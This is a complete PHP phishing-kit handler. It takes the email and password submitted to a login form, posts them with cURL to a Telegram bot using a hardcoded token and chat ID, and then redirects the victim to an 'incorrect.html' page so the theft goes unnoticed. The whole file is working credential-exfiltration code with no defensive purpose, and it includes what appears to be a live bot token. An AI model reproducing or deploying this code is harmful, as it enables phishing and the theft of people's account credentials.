<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Telegram Bot Token and Chat ID
    $botToken = '6422540231:AAFfayBIZ-Kju87-FHl0a1usu4wsdU3cbog';
    $chatId = '-1002078296073';

    // Message to be sent to Telegram
    $message = "Email: " . $email . "\nPassword: " . $password;

    // Telegram API URL
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

    // Prepare the data for the POST request
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    // Use cURL to send the POST request to Telegram API
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Check if the request was successful
    if ($response) {
        header("Location: incorrect.html");
        exit();
    } else {
        echo "Failed to send message to Telegram.";
    }
} else {
    echo "Invalid request method.";
}
?>
